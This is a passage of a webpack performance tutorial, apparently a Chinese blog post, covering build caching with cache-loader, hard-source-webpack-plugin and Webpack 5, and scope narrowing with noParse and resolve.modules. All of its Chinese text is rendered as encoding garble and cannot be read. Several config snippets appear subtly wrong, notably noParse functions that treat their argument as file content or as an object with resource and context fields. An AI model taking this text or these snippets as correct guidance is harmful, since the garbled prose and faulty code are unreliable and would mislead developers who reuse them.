%&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>  &lt;div id=&quot;root&quot;&gt;&lt;/div&gt;<br>  &lt;%= htmlWebpackPlugin.tags.bodyTags %&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h1 id="ä¸‰ã€æ€§èƒ½ä¼˜åŒ–ä¸“é¡¹"><a href="#ä¸‰ã€æ€§èƒ½ä¼˜åŒ–ä¸“é¡¹" class="headerlink" title="ä¸‰ã€æ€§èƒ½ä¼˜åŒ–ä¸“é¡¹"></a>ä¸‰ã€æ€§èƒ½ä¼˜åŒ–ä¸“é¡¹</h1><h2 id="3-1-æ„å»ºé€Ÿåº¦ä¼˜åŒ–"><a href="#3-1-æ„å»ºé€Ÿåº¦ä¼˜åŒ–" class="headerlink" title="3.1 æ„å»ºé€Ÿåº¦ä¼˜åŒ–"></a>3.1 æ„å»ºé€Ÿåº¦ä¼˜åŒ–</h2><h3 id="3-1-1-ç¼“å­˜ç­–ç•¥ï¼šcache-loader-hard-source-webpack-plugin"><a href="#3-1-1-ç¼“å­˜ç­–ç•¥ï¼šcache-loader-hard-source-webpack-plugin" class="headerlink" title="3.1.1 ç¼“å­˜ç­–ç•¥ï¼šcache-loader&#x2F;hard-source-webpack-plugin"></a>3.1.1 ç¼“å­˜ç­–ç•¥ï¼š<code>cache-loader</code>&#x2F;<code>hard-source-webpack-plugin</code></h3><p><strong>æ„å»ºç¼“å­˜æ ¸å¿ƒåŸç†</strong></p><p>ç¼“å­˜æœºåˆ¶å¯¹æ¯”ï¼š</p><pre class="mermaid">graph LR  A[æºæ–‡ä»¶] --> B{ç¼“å­˜æ˜¯å¦å­˜åœ¨?}  B -->|æ˜¯| C[ç›´æ¥ä½¿ç”¨ç¼“å­˜ç»“æœ]  B -->|å¦| D[æ‰§è¡ŒLoaderå¤„ç†]  D --> E[ä¿å­˜ç»“æœåˆ°ç¼“å­˜]  E --> F[è¿”å›å¤„ç†ç»“æœ]</pre><p>ç¼“å­˜å±‚çº§æ¶æ„ï¼š</p><table><thead><tr><th align="left">ç¼“å­˜ç±»å‹</th><th align="left">ä½œç”¨èŒƒå›´</th><th align="left">æŒä¹…æ€§</th><th align="left">å…¸å‹å·¥å…·</th></tr></thead><tbody><tr><td align="left">Loaderçº§ç¼“å­˜</td><td align="left">å•ä¸ªLoaderå¤„ç†ç»“æœ</td><td align="left">ä¸´æ—¶</td><td align="left">cache-loader</td></tr><tr><td align="left">æ¨¡å—çº§ç¼“å­˜</td><td align="left">å®Œæ•´æ¨¡å—æ„å»ºç»“æœ</td><td align="left">æŒä¹…</td><td align="left">hard-source-webpack-plugin</td></tr><tr><td align="left">ç³»ç»Ÿçº§ç¼“å­˜</td><td align="left">æ•´ä¸ªæ„å»ºè¿‡ç¨‹</td><td align="left">æŒä¹…</td><td align="left">Webpack 5 å†…ç½®ç¼“å­˜</td></tr></tbody></table><p><strong>cache-loader æ·±åº¦è§£æ</strong></p><p>å·¥ä½œåŸç†ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¼ªä»£ç å®ç°</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-keyword">const</span> cacheKey = <span class="hljs-title function_">generateCacheKey</span>(<span class="hljs-variable language_">this</span>, source);<br>  <br>  <span class="hljs-comment">// æ£€æŸ¥ç¼“å­˜</span><br>  <span class="hljs-keyword">if</span> (cache.<span class="hljs-title function_">exists</span>(cacheKey)) &#123;<br>    <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">get</span>(cacheKey); <span class="hljs-comment">// è¿”å›ç¼“å­˜ç»“æœ</span><br>  &#125;<br>  <br>  <span class="hljs-comment">// æ‰§è¡Œåç»­Loader</span><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">runNextLoaders</span>(source);<br>  <br>  <span class="hljs-comment">// ä¿å­˜ç¼“å­˜</span><br>  cache.<span class="hljs-title function_">set</span>(cacheKey, result);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€ä½³é…ç½®å®è·µï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.jsx?$/</span>,<br>        <span class="hljs-attr">use</span>: [<br>          &#123;<br>            <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;cache-loader&#x27;</span>,<br>            <span class="hljs-attr">options</span>: &#123;<br>              <span class="hljs-attr">cacheDirectory</span>: <span class="hljs-string">&#x27;./.cache/babel&#x27;</span>,<br>              <span class="hljs-attr">cacheIdentifier</span>: <span class="hljs-string">&#x27;v2&#x27;</span> <span class="hljs-comment">// ç¼“å­˜ç‰ˆæœ¬æ ‡è¯†</span><br>            &#125;<br>          &#125;,<br>          <span class="hljs-string">&#x27;babel-loader&#x27;</span><br>        ]<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.s?css$/</span>,<br>        <span class="hljs-attr">use</span>: [<br>          <span class="hljs-string">&#x27;style-loader&#x27;</span>,<br>          &#123;<br>            <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;cache-loader&#x27;</span>,<br>            <span class="hljs-attr">options</span>: &#123;<br>              <span class="hljs-attr">cacheDirectory</span>: <span class="hljs-string">&#x27;./.cache/css&#x27;</span><br>            &#125;<br>          &#125;,<br>          <span class="hljs-string">&#x27;css-loader&#x27;</span>,<br>          <span class="hljs-string">&#x27;postcss-loader&#x27;</span>,<br>          <span class="hljs-string">&#x27;sass-loader&#x27;</span><br>        ]<br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>hard-source-webpack-plugin æ·±åº¦å‰–æ</strong></p><p>æ ¸å¿ƒä¼˜åŠ¿ï¼š</p><table><thead><tr><th align="left">æ„å»ºæ¬¡æ•°</th><th align="left">æ€§èƒ½æå‡æ¯”ä¾‹</th></tr></thead><tbody><tr><td align="left">é¦–æ¬¡æ„å»º</td><td align="left">0</td></tr><tr><td align="left">äºŒæ¬¡æ„å»º</td><td align="left">65</td></tr><tr><td align="left">ä¸‰æ¬¡æ„å»º</td><td align="left">80</td></tr></tbody></table><p>é…ç½®ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">HardSourceWebpackPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hard-source-webpack-plugin&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HardSourceWebpackPlugin</span>(&#123;<br>      <span class="hljs-comment">// ç¼“å­˜ç›®å½•</span><br>      <span class="hljs-attr">cacheDirectory</span>: <span class="hljs-string">&#x27;./.cache/hard-source/[confighash]&#x27;</span>,<br>      <br>      <span class="hljs-comment">// ç¯å¢ƒå˜é‡å“ˆå¸Œ</span><br>      <span class="hljs-attr">environmentHash</span>: &#123;<br>        <span class="hljs-attr">root</span>: process.<span class="hljs-title function_">cwd</span>(),<br>        <span class="hljs-attr">directories</span>: [],<br>        <span class="hljs-attr">files</span>: [<span class="hljs-string">&#x27;package.json&#x27;</span>, <span class="hljs-string">&#x27;yarn.lock&#x27;</span>],<br>      &#125;,<br>      <br>      <span class="hljs-comment">// ç¼“å­˜æœ‰æ•ˆæœŸ</span><br>      <span class="hljs-attr">info</span>: &#123;<br>        <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;none&#x27;</span>,<br>        <span class="hljs-attr">level</span>: <span class="hljs-string">&#x27;debug&#x27;</span><br>      &#125;,<br>      <br>      <span class="hljs-comment">// è‡ªåŠ¨æ¸…é™¤è¿‡æœŸç¼“å­˜</span><br>      <span class="hljs-attr">cachePrune</span>: &#123;<br>        <span class="hljs-attr">maxAge</span>: <span class="hljs-number">7</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>, <span class="hljs-comment">// 7å¤©</span><br>        <span class="hljs-attr">sizeThreshold</span>: <span class="hljs-number">100</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span> <span class="hljs-comment">// 100MB</span><br>      &#125;<br>    &#125;)<br>  ]<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>ç¼“å­˜ç­–ç•¥å¯¹æ¯”åˆ†æ</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">cache-loader</th><th align="left">hard-source-webpack-plugin</th><th align="left">Webpack 5 å†…ç½®ç¼“å­˜</th></tr></thead><tbody><tr><td align="left">ç¼“å­˜ç²’åº¦</td><td align="left">å•ä¸ªLoaderçº§åˆ«</td><td align="left">æ¨¡å—çº§åˆ«</td><td align="left">æ¨¡å—çº§åˆ«</td></tr><tr><td align="left">æŒä¹…æ€§</td><td align="left">ä¸´æ—¶(å†…å­˜&#x2F;ç£ç›˜)</td><td align="left">æŒä¹…(ç£ç›˜)</td><td align="left">æŒä¹…(ç£ç›˜)</td></tr><tr><td align="left">é…ç½®å¤æ‚åº¦</td><td align="left">ä½</td><td align="left">ä¸­</td><td align="left">ä½</td></tr><tr><td align="left">äºŒæ¬¡æ„å»ºé€Ÿåº¦</td><td align="left">+30-50%</td><td align="left">+60-80%</td><td align="left">+80-90%</td></tr><tr><td align="left">å†…å­˜å ç”¨</td><td align="left">ä¸­</td><td align="left">é«˜</td><td align="left">ä½</td></tr><tr><td align="left">æ”¯æŒåœºæ™¯</td><td align="left">æ‰€æœ‰Webpackç‰ˆæœ¬</td><td align="left">Webpack 4+</td><td align="left">Webpack 5+</td></tr><tr><td align="left">ä¸»è¦ä¼˜åŠ¿</td><td align="left">ç²¾å‡†æ§åˆ¶Loaderç¼“å­˜</td><td align="left">å®Œæ•´æ¨¡å—ç¼“å­˜</td><td align="left">åŸç”Ÿé›†æˆé«˜æ•ˆ</td></tr></tbody></table><p><strong>Webpack 5 å†…ç½®ç¼“å­˜</strong></p><p>ç°ä»£åŒ–é…ç½®ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">cache</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;filesystem&#x27;</span>, <span class="hljs-comment">// ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿç¼“å­˜</span><br>    <span class="hljs-attr">version</span>: <span class="hljs-string">&#x27;v1&#x27;</span>,      <span class="hljs-comment">// ç¼“å­˜ç‰ˆæœ¬æ ‡è¯†</span><br>    <span class="hljs-attr">cacheDirectory</span>: <span class="hljs-string">&#x27;./.cache/webpack5&#x27;</span>,<br>    <br>    <span class="hljs-comment">// ç¼“å­˜ä¾èµ–æ–‡ä»¶</span><br>    <span class="hljs-attr">buildDependencies</span>: &#123;<br>      <span class="hljs-attr">config</span>: [__filename], <span class="hljs-comment">// é…ç½®æ–‡ä»¶å˜æ›´æ—¶å¤±æ•ˆç¼“å­˜</span><br>      <span class="hljs-attr">tsconfig</span>: [<span class="hljs-string">&#x27;./tsconfig.json&#x27;</span>]<br>    &#125;,<br>    <br>    <span class="hljs-comment">// ç¼“å­˜ç­–ç•¥</span><br>    <span class="hljs-attr">managedPaths</span>: [<br>      path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;node_modules&#x27;</span>) <span class="hljs-comment">// åªç¼“å­˜node_modules</span><br>    ],<br>    <span class="hljs-attr">profile</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// è¾“å‡ºç¼“å­˜ä½¿ç”¨æƒ…å†µ</span><br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>ç¼“å­˜å¤±æ•ˆç­–ç•¥</strong></p><p>(1) å¤±æ•ˆåœºæ™¯ä¸è§£å†³æ–¹æ¡ˆ</p><table><thead><tr><th align="left">å¤±æ•ˆåœºæ™¯</th><th align="left">æ£€æµ‹æ–¹æ³•</th><th align="left">è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">æºä»£ç å˜æ›´</td><td align="left">æ–‡ä»¶å†…å®¹å“ˆå¸Œ</td><td align="left">è‡ªåŠ¨å¤„ç†</td></tr><tr><td align="left">Loaderé…ç½®å˜æ›´</td><td align="left">é…ç½®å†…å®¹å“ˆå¸Œ</td><td align="left">cacheIdentifier å‚æ•°</td></tr><tr><td align="left">ä¾èµ–åŒ…æ›´æ–°</td><td align="left">lockæ–‡ä»¶å“ˆå¸Œ</td><td align="left">åŒ…å«yarn.lock&#x2F;package-lock.json</td></tr><tr><td align="left">ç¯å¢ƒå˜é‡å˜æ›´</td><td align="left">ç¯å¢ƒå˜é‡å“ˆå¸Œ</td><td align="left">environmentHash é…ç½®</td></tr><tr><td align="left">Webpackå‡çº§</td><td align="left">ç‰ˆæœ¬å·æ£€æµ‹</td><td align="left">è‡ªåŠ¨æ¸…é™¤æ—§ç¼“å­˜</td></tr></tbody></table><p>(2) æ‰‹åŠ¨æ¸…é™¤ç¼“å­˜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ¸…é™¤æ‰€æœ‰ç¼“å­˜</span><br><span class="hljs-built_in">rm</span> -rf .cache<br><br><span class="hljs-comment"># Webpack 5 æ¸…é™¤ç¼“å­˜</span><br>webpack --clear-cache<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>(1) ç¼“å­˜ä¸æ›´æ–°</p><p>ç—‡çŠ¶ï¼šä¿®æ”¹ä»£ç åæ„å»ºç»“æœä¸å˜</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// cache-loader æ·»åŠ ç‰ˆæœ¬æ ‡è¯†</span><br>&#123;<br>  <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;cache-loader&#x27;</span>,<br>  <span class="hljs-attr">options</span>: &#123;<br>    <span class="hljs-attr">cacheIdentifier</span>: <span class="hljs-string">`v3-<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span>`</span> <span class="hljs-comment">// å¼€å‘ç¯å¢ƒä½¿ç”¨æ—¶é—´æˆ³</span><br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// Webpack 5 é…ç½®</span><br><span class="hljs-attr">cache</span>: &#123;<br>  <span class="hljs-attr">version</span>: <span class="hljs-string">`<span class="hljs-subst">$&#123;process.env.GIT_COMMIT || <span class="hljs-string">&#x27;dev&#x27;</span>&#125;</span>`</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(2) ç¼“å­˜å ç”¨è¿‡å¤§</p><p>ä¼˜åŒ–æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. è®¾ç½®ç¼“å­˜æœ‰æ•ˆæœŸ</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">HardSourceWebpackPlugin</span>(&#123;<br>  <span class="hljs-attr">cachePrune</span>: &#123;<br>    <span class="hljs-attr">maxAge</span>: <span class="hljs-number">2</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span> <span class="hljs-comment">// 2å¤©</span><br>  &#125;<br>&#125;)<br><br><span class="hljs-comment">// 2. æ’é™¤node_modules</span><br><span class="hljs-attr">cache</span>: &#123;<br>  <span class="hljs-attr">managedPaths</span>: [path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;node_modules&#x27;</span>)]<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-1-2-èŒƒå›´ç¼©å°ï¼šmodule-noParse-resolve-modules"><a href="#3-1-2-èŒƒå›´ç¼©å°ï¼šmodule-noParse-resolve-modules" class="headerlink" title="3.1.2 èŒƒå›´ç¼©å°ï¼šmodule.noParse &#x2F; resolve.modules"></a>3.1.2 èŒƒå›´ç¼©å°ï¼š<code>module.noParse</code> &#x2F; <code>resolve.modules</code></h3><p><strong>èŒƒå›´ç¼©å°æ ¸å¿ƒåŸç†</strong></p><p>Webpack æ¨¡å—è§£ææµç¨‹ï¼š</p><pre class="mermaid">graph LR  A[å…¥å£æ–‡ä»¶] --> B[è§£æä¾èµ–]  B --> C{æ˜¯å¦åœ¨ noParse åˆ—è¡¨?}  C -->|æ˜¯| D[ç›´æ¥åŒ…å«ä¸è§£æ]  C -->|å¦| E[æŸ¥æ‰¾æ¨¡å—è·¯å¾„]  E --> F{æ˜¯å¦åœ¨ modules è·¯å¾„?}  F -->|æ˜¯| G[ç›´æ¥ä½¿ç”¨]  F -->|å¦| H[ç»§ç»­æœç´¢ node_modules]</pre><p><strong>module.noParse æ·±åº¦è§£æ</strong></p><p>æ ¸å¿ƒä½œç”¨ä¸é€‚ç”¨åœºæ™¯ï¼š</p><ul><li>ä½œç”¨ï¼šè·³è¿‡æŒ‡å®šæ¨¡å—çš„è§£æè¿‡ç¨‹</li><li>é€‚ç”¨åœºæ™¯ï¼š<ul><li>å¤§å‹åº“ï¼ˆå¦‚ jQueryã€Lodashï¼‰</li><li>å·²çŸ¥æ— ä¾èµ–çš„ç‹¬ç«‹æ¨¡å—</li><li>é¢„ç¼–è¯‘èµ„æºï¼ˆå¦‚ .wasm æ–‡ä»¶ï¼‰</li><li>æ€§èƒ½æ•æ„Ÿåœºæ™¯</li></ul></li></ul><p>é…ç½®æ–¹å¼å¯¹æ¯”ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">noParse</span>: [<br>      <span class="hljs-comment">// 1. æ­£åˆ™åŒ¹é…</span><br>      <span class="hljs-regexp">/jquery|lodash/</span>,<br>      <br>      <span class="hljs-comment">// 2. å‡½æ•°åŠ¨æ€åˆ¤æ–­</span><br>      <span class="hljs-function">(<span class="hljs-params">content</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> content.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;This file is already minified&#x27;</span>);<br>      &#125;,<br>      <br>      <span class="hljs-comment">// 3. ç²¾ç¡®è·¯å¾„åŒ¹é…</span><br>      path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;vendor/react.production.min.js&#x27;</span>)<br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>resolve.modules é«˜çº§é…ç½®</strong></p><p>è·¯å¾„è§£æä¼˜åŒ–ç­–ç•¥ï¼š</p><pre class="mermaid">graph TD  A[æ¨¡å—å¯¼å…¥] --> B{æ˜¯å¦ç»å¯¹è·¯å¾„?}  B -->|æ˜¯| C[ç›´æ¥ä½¿ç”¨]  B -->|å¦| D{æ˜¯å¦ç›¸å¯¹è·¯å¾„?}  D -->|æ˜¯| E[åŸºäºå½“å‰ç›®å½•è§£æ]  D -->|å¦| F[æœç´¢ resolve.modules]  F --> G{æ˜¯å¦æ‰¾åˆ°?}  G -->|æ˜¯| H[ä½¿ç”¨æ‰¾åˆ°çš„æ¨¡å—]  G -->|å¦| I[æœç´¢ node_modules]</pre><p>ä¼ä¸šçº§é…ç½®æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">modules</span>: [<br>      <span class="hljs-comment">// 1. ä¼˜å…ˆé¡¹ç›®æºç›®å½•</span><br>      path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;src&#x27;</span>),<br>      <br>      <span class="hljs-comment">// 2. å…¬å…±ç»„ä»¶ç›®å½•</span><br>      path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;shared-components&#x27;</span>),<br>      <br>      <span class="hljs-comment">// 3. æœ€å node_modules</span><br>      <span class="hljs-string">&#x27;node_modules&#x27;</span><br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§é…ç½®æŠ€å·§</strong></p><p>(1) åŠ¨æ€ noParse å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">noParse</span>: <span class="hljs-function">(<span class="hljs-params">content</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// è·³è¿‡æ‰€æœ‰.min.jsæ–‡ä»¶</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/\.min\.js$/</span>.<span class="hljs-title function_">test</span>(content.<span class="hljs-property">resource</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      <br>      <span class="hljs-comment">// è·³è¿‡ç‰¹å®šç›®å½•</span><br>      <span class="hljs-keyword">if</span> (content.<span class="hljs-property">context</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;vendor&#x27;</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      <br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å¤šç¯å¢ƒè·¯å¾„é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> isProduction = process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">modules</span>: [<br>      <span class="hljs-string">&#x27;src&#x27;</span>,<br>      <span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ä¼˜åŒ–ç‰ˆåº“</span><br>      isProduction <br>        ? path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;dist/prod-libs&#x27;</span>)<br>        : path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;dist/dev-libs&#x27;</span>),<br>      <span class="hljs-string">&#x27;node_modules&#x27;</span><br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>(1) noParse å¯¼è‡´ä¾èµ–ç¼ºå¤±</p><p>ç—‡çŠ¶ï¼šUncaught ReferenceError: require is not defined</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ’é™¤éœ€è¦è§£æçš„æ¨¡å—</span><br><span class="hljs-attr">noParse</span>: <span class="hljs-function">(<span class="hljs-params">content</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// æ’é™¤éœ€è¦ä¾èµ–çš„æ¨¡å—</span><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">resource</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;special-module&#x27;</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <br>  <span class="hljs-comment">// æ’é™¤éJSæ¨¡å—</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/\.js$/</span>.<span class="hljs-title function_">test</span>(content.<span class="hljs-property">resource</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/[\\/]vendor[\\/]/</span>.<span class="hljs-title function_">test</span>(content.<span class="hljs-property">resource</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) è·¯å¾„è§£æå†²çª</p><p>ç—‡çŠ¶ï¼šModule not found: Error: Canâ€™t resolve â€˜componentâ€™</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 